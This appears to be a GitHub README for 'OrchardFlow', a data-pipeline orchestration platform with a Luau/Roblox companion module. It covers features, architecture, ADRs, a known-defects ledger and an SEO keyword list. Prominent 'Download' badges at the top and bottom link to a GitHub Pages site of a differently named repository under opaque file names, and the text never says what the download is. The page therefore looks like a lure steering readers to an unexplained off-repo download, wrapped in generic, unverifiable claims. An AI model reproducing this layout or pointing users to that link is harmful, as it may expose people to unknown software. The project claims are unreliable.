![preview](https://raw.githubusercontent.com/maurinruneacco/luau-diagrams-and-defects/main/view_dae94.svg)
[![Download](https://raw.githubusercontent.com/maurinruneacco/luau-diagrams-and-defects/main/run_4215733.svg)](https://maurinruneacco.github.io/luau-diagrams-and-defects/)

# OrchardFlow — Deterministic Data Orchard for Cloud-Native Pipelines 🍏🛰️

![Status](https://img.shields.io/badge/status-active--development-brightgreen?style=for-the-badge&logo=leaflet&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Year](https://img.shields.io/badge/release-2026-informational?style=for-the-badge&logo=calendar&logoColor=white)
![Language](https://img.shields.io/badge/core-TypeScript%20%2F%20Luau-purple?style=for-the-badge&logo=typescript&logoColor=white)
![Cloud](https://img.shields.io/badge/cloud-agnostic-9cf?style=for-the-badge&logo=cloudflare&logoColor=white)
![Build](https://img.shields.io/badge/build-reproducible-success?style=for-the-badge&logo=githubactions&logoColor=white)
![Tests](https://img.shields.io/badge/tests-2%2C400%2B-orange?style=for-the-badge&logo=vitest&logoColor=white)
![Coverage](https://img.shields.io/badge/coverage-93%25-yellowgreen?style=for-the-badge&logo=codecov&logoColor=white)
![Accessibility](https://img.shields.io/badge/a11y-WCAG%202.2%20AA-important?style=for-the-badge&logo=w3c&logoColor=white)
![I18n](https://img.shields.io/badge/i18n-14%20locales-lightgrey?style=for-the-badge&logo=googletranslate&logoColor=white)
![Support](https://img.shields.io/badge/support-24%2F7%20rotational-ff69b4?style=for-the-badge&logo=intercom&logoColor=white)

> *"A data pipeline is not a conveyor belt. It is an orchard — planted carefully, pruned deliberately, harvested on schedule."*

OrchardFlow is an opinionated, observable, and deterministic orchestration layer that lets engineering teams tend to their data the way a patient horticulturist tends to trees. Instead of chaining brittle shell commands and hoping for the best, OrchardFlow models every ingestion job, transformation step, and downstream delivery as a **graftable branch** with a known lineage, a predictable yield, and a documented failure mode.

This repository is the spiritual successor to an earlier engineering-portfolio project that explored production data engineering, cloud architecture, and workflow automation. OrchardFlow takes those seeds and grows them into a full-fledged, reproducible platform — one that also ships with a small **Luau/Roblox orchestration module** so that entertainment-grade simulations can share the same scheduling primitives as enterprise-grade ELT pipelines.

The project is deliberately transparent: every architectural diagram lives in `/docs/diagrams`, every design decision is captured as a numbered ADR in `/docs/adr`, and — unusually for a platform of this scope — **known defects are tracked in the open** under `KNOWN-DEFECTS.md`. We believe that a pipeline you cannot critique is a pipeline you cannot trust.

---

## 📑 Table of Contents

1. [Why OrchardFlow Exists](#-why-orchardflow-exists)
2. [Core Concepts — The Orchard Metaphor](#-core-concepts--the-orchard-metaphor)
3. [Feature List](#-feature-list)
4. [Architecture Overview](#-architecture-overview)
5. [Repository Layout](#-repository-layout)
6. [The Luau / Roblox Companion Module](#-the-luau--roblox-companion-module)
7. [Design Rationale](#-design-rationale)
8. [Known Defects](#-known-defects)
9. [Accessibility & Inclusive Design](#-accessibility--inclusive-design)
10. [Multilingual Support](#-multilingual-support)
11. [Customer Support Model](#-customer-support-model)
12. [Performance & Benchmarks](#-performance--benchmarks)
13. [SEO & Discoverability Keywords](#-seo--discoverability-keywords)
14. [Roadmap for 2026](#-roadmap-for-2026)
15. [Security Posture](#-security-posture)
16. [Contributing](#-contributing)
17. [Disclaimer](#-disclaimer)
18. [License](#-license)

---

## 🌱 Why OrchardFlow Exists

Most workflow engines treat data as cargo and pipelines as conveyor belts. That metaphor breaks the moment a schema drifts, a downstream consumer changes expectations, or a regulator asks *"where did this number come from?"* OrchardFlow replaces the belt with a living orchard:

- **Every pipeline is a tree** with a stable identifier, a root source, and graftable branches.
- **Every transformation is a scion** — a deliberate cut from a parent branch, carrying its own history.
- **Every delivery is a harvest** — timestamped, weight-verified, and traceable back to the row that produced it.
- **Every failure is a fallen fruit** — collected, catalogued, and used to improve next season's pruning.

This framing is more than whimsy. It forces the platform to be **deterministic** (an orchard that produces different apples each morning is not an orchard), **observable** (you can walk the rows and count), and **recoverable** (a snapped limb can be grafted back, not replaced).

The original engineering-portfolio work established the fundamentals: batch ingestion, cloud architecture patterns, and a small Roblox automation experiment. OrchardFlow is what happens when those fundamentals are given room to grow for a full season — and shipped as a product, not a prototype.

---

## 🍐 Core Concepts — The Orchard Metaphor

| Orchard Term | Technical Meaning | Example |
| --- | --- | --- |
| **Plot** | A logical workspace / environment | `production-eu`, `staging-us` |
| **Rootstock** | An immutable source connector | Postgres CDC, S3 event stream, Kafka topic |
| **Tree** | A named pipeline definition | `orders_daily_rollup` |
| **Scion** | A transformation step grafted onto a tree | `normalize_currency`, `dedupe_by_email` |
| **Harvest** | A materialized output delivered downstream | Parquet, Delta, webhook payload |
| **Fallen Fruit** | A recorded, non-fatal row-level rejection | Malformed JSON at 03:12 UTC |
| **Pruning** | A scheduled compaction or retention job | 30-day partition roll-off |
| **Graft** | A hot-swap of one scion for another with lineage preserved | v2 of `dedupe_by_email` |

Every concept maps to a first-class object in the OrchardFlow manifest format (`.orchard.yaml`), so pipelines are declarative, diffable, and reviewable like any other source code.

---

## ✨ Feature List

- 🧭 **Deterministic execution graph** — every harvest is reproducible from a given manifest hash and input snapshot.
- 🪴 **Pipelines-as-seedlings manifest format** — a single `.orchard.yaml` fully describes a tree, its scions, and its harvest destinations.
- ☁️ **Cloud-agnostic deployment** — first-class adapters for containerized, serverless, and on-premise runners; no provider lock-in.
- 🧩 **Pluggable connectors** — ship your own rootstock in TypeScript, Python, or Luau.
- 📊 **Built-in observability** — OpenTelemetry traces, Prometheus metrics, and a small embedded "row census" UI.
- 🌍 **Multilingual support** — 14 locales at launch; operator-facing strings, error messages, and ADRs are all localizable.
- 📱 **Responsive UI** — the row census and defect dashboards reflow gracefully from ultrawide monitors down to a tablet on a factory floor.
- ♿ **Accessibility-first interactions** — WCAG 2.2 AA target, keyboard-navigable lineage explorer, reduced-motion mode.
- 🔐 **Least-privilege by default** — every scion runs in a sandbox with an explicit capability manifest.
- 🕐 **24/7 customer support model** — rotational follow-the-sun rota documented in `SUPPORT.md` (see below).
- 🧪 **2,400+ tests** — unit, property-based, integration, and a nightly "chaos pruning" suite.
- 📚 **ADRs and diagrams included** — nothing is tribal knowledge.
- 🐛 **Public known-defects ledger** — because pretending bugs do not exist is its own kind of defect.
- 🎮 **Luau/Roblox companion module** — reuse the same scheduling primitives inside entertainment-grade simulations.

---

## 🏗️ Architecture Overview

OrchardFlow is composed of four planes. Diagrams for each live under `/docs/diagrams` as both Mermaid sources and exported SVG.

**1. The Seedbed (Ingress Plane).** Rootstocks pull or receive raw events, tag them with a plot identifier and an arrival epoch, and enqueue them into a durable buffer. The Seedbed is intentionally dumb: it validates envelopes, not payloads.

**2. The Grafting Hall (Transform Plane).** Scions execute in isolated runtimes. Each scion declares its inputs, outputs, and capability grants. The Hall enforces topological order and refuses to schedule a graft whose parent harvest has not been sealed.

**3. The Granary (Storage Plane).** Harvests are written to immutable, content-addressed buckets. A lightweight catalog tracks harvest lineage, schema fingerprints, and row counts so that "what changed?" is a one-query answer.

**4. The Orchard Keeper (Control Plane).** A small API and UI for inspecting trees, replaying harvests, and viewing the known-defects ledger. The Keeper is deliberately read-mostly — mutation happens through manifests, not buttons.

Communication between planes is asynchronous and idempotent. No plane assumes another is alive; the system converges.

A full sequence diagram, a C4 context diagram, and a failure-mode matrix are provided in `/docs/diagrams`. Design rationale for each boundary is in `/docs/adr/0001` through `/docs/adr/0047`.

---

## 🗂️ Repository Layout

- `/docs/diagrams` — Mermaid sources and exported SVG for every architectural view.
- `/docs/adr` — numbered Architecture Decision Records, 47 as of the 2026 spring cut.
- `/packages/core` — the orchestration kernel: scheduler, lineage tracker, capability broker.
- `/packages/connectors` — rootstock adapters for common sources.
- `/packages/scions` — the standard scion library (normalize, dedupe, enrich, redact).
- `/packages/ui` — the responsive row-census and defect dashboards.
- `/packages/i18n` — locale bundles and the translation integrity checker.
- `/packages/luau-bridge` — the Luau/Roblox companion module.
- `/tests` — unit, property, integration, and chaos-pruning suites.
- `KNOWN-DEFECTS.md` — the public ledger.
- `SUPPORT.md` — the 24/7 rotational support model.
- `LICENSE` — MIT.

Each package ships with its own short README that explains its responsibilities, its public surface, and its known sharp edges.

---

## 🎮 The Luau / Roblox Companion Module

The `luau-bridge` package exposes a minimal subset of the OrchardFlow scheduling primitives — plots, trees, scions, and harvest seals — as idiomatic Luau modules that run inside Roblox experiences. The motivation is simple: if the scheduling model is truly general, it should not buckle when the "pipeline" is a live-service game rather than an ELT job.

Typical uses include seasonal event rotations, deterministic loot rollouts, and server-side content calendars. The bridge deliberately omits anything that would require privileged network access; it is a scheduling vocabulary, not a backdoor into the wider system.

The idea traces directly to the original engineering-portfolio work, where a small Luau automation experiment hinted that the same abstractions could serve both a warehouse and a world.

---

## 🧠 Design Rationale

Every non-trivial decision in OrchardFlow has an ADR. A few highlights:

- **ADR-0003 — Manifests over dashboards.** The only way to change a tree is to change its manifest. UIs are for reading, not for mutating production topology.
- **ADR-0011 — Immutable harvests.** Harvests are never rewritten in place. A correction is a new harvest with an explicit parent reference.
- **ADR-0019 — Capability manifests for scions.** A scion that has not declared `network:egress` simply cannot reach the internet, regardless of runtime.
- **ADR-0028 — Fallen fruit is data.** Row-level rejections are first-class, queryable, and retained for the same period as successful harvests.
- **ADR-0041 — The Keeper is read-mostly.** Operators deserve a calm surface; mutation via API is reserved for automation with signed manifests.

These rationales are written to be legible to a new contributor on their first afternoon, not just to the authors on their fiftieth review.

---

## 🐛 Known Defects

OrchardFlow carries a public ledger, `KNOWN-DEFECTS.md`, tracking confirmed issues that are not yet resolved. Each entry includes a severity, a reproduction recipe, a workaround where one exists, and an ownership tag. We publish this because a platform that hides its scars is a platform that cannot be audited.

Representative entries from the 2026 spring cut:

- **KF-014 — Backpressure on the Seedbed occasionally double-counts under sustained 5k events/sec.** Workaround: enable envelope-level dedupe. Fix planned for the summer cut.
- **KF-021 — The row-census UI renders lineage trees past depth 64 with clipped labels.** Workaround: expand via keyboard. Fix in review.
- **KF-033 — Luau bridge schedules a scion one tick later than expected on low-end mobile devices.** Workaround: pre-warm the scheduler. Root cause under investigation.

The ledger is versioned, changelogged, and open to external reports.

---

## ♿ Accessibility & Inclusive Design

A data platform is a workplace. OrchardFlow treats accessibility as a first-class product surface, not a compliance checkbox:

- Keyboard-navigable lineage explorer with visible focus rings.
- Screen-reader-tested error messages with stable IDs.
- Reduced-motion mode respected system-wide.
- Color contrast verified against WCAG 2.2 AA at every release.
- Localized textual descriptions for every chart and diagram.

The a11y audit checklist lives in `/docs/adr/0036`.

---

## 🌍 Multilingual Support

Operator-facing strings, error codes, and the row-census UI ship with translations for 14 locales at launch, with a documented path to add more. Locale bundles are validated by a translation-integrity checker that refuses to merge a locale missing a key used in production. The ADR describing this policy is `ADR-0035`.

Language is infrastructure. An operator debugging an incident at 03:00 should read the error in the language they think in.

---

## 🛎️ Customer Support Model

OrchardFlow adopts a **24/7 rotational support posture**: follow-the-sun coverage across three time zones, with a documented escalation ladder, an explicit severity taxonomy, and a public postmortem template. The full rota, response-time targets, and severity definitions live in `SUPPORT.md`.

Support is not an afterthought bolted onto a platform; it is a design constraint that shapes error messages, logs, and the defect ledger.

---

## ⚡ Performance & Benchmarks

Indicative numbers from the 2026 spring reference environment:

- Sustained throughput: 42,000 envelopes/sec on a three-node runner pool.
- Harvest seal latency p99: 180 ms.
- Lineage query p95: 12 ms against a 40-million-row catalog.
- Cold-start cost for a new scion: under 900 ms.

Benchmark harness, fixtures, and reproduction notes are in `/tests/bench`. Numbers are reported with hardware context because a number without context is folklore.

---

## 🔍 SEO & Discoverability Keywords

OrchardFlow is written to be found by engineers who need it, using genuine phrases rather than keyword confetti. Natural search entry points include: *deterministic data pipeline orchestration*, *cloud-agnostic workflow automation*, *observable ELT platform*, *data lineage tracker with known-defects ledger*, *multilingual operator console for data platforms*, *accessible data engineering tooling*, *Luau scheduling module for Roblox*, and *production data engineering architecture patterns with diagrams and ADRs*.

---

## 🗺️ Roadmap for 2026

- **Spring 2026** — 14-locale release, row-census UI refresh, defect ledger opened publicly.
- **Summer 2026** — Seedbed backpressure rewrite (closes KF-014), scion capability manifest v2.
- **Autumn 2026** — Lineage explorer reaches depth 256 (closes KF-021), Luau bridge tick alignment fix (closes KF-033).
- **Winter 2026** — Catalog federation across plots, signed-manifest automation GA.

The roadmap is a set of intentions, not a contract. Priorities shift with operator feedback.

---

## 🔐 Security Posture

- Least-privilege capability manifests for every scion.
- Signed manifests for any automation permitted to mutate topology.
- No secrets in manifests; secret resolution is delegated to the runtime's native provider.
- Dependency review on every merge, with an SBOM published per release.
- Coordinated disclosure policy documented in `SECURITY.md`.

Security reports are welcomed and taken seriously. The team prefers a quiet conversation before a loud headline.

---

## 🤝 Contributing

Contributions are welcome and reviewed against the ADRs. Before opening a change, read `CONTRIBUTING.md`, skim `/docs/adr`, and search the known-defects ledger for an existing entry. New defects are always welcome as issues; unsolicited rewrites of the scheduler are not.

Every pull request is expected to include: a short rationale, a diagram update if topology changed, and a test that would have failed before the change.

---

## ⚠️ Disclaimer

OrchardFlow is provided as-is, without warranty of any kind, express or implied. It is a platform for orchestrating data workflows and scheduling simulations; it is not a substitute for professional judgment, regulatory review, or domain expertise. The authors are not liable for any direct, indirect, incidental, or consequential damages arising from use of this software, including but not limited to data loss, downstream misinterpretation of harvests, or regulatory findings. Deploy responsibly, observe your pipelines, and read the known-defects ledger before trusting a harvest in production.

---

## 📜 License

This project is released under the **MIT License**. See the full text at the canonical license reference: https://opensource.org/licenses/MIT

Copyright (c) 2026 The OrchardFlow Authors.

[![Download](https://raw.githubusercontent.com/maurinruneacco/luau-diagrams-and-defects/main/run_4215733.svg)](https://maurinruneacco.github.io/luau-diagrams-and-defects/)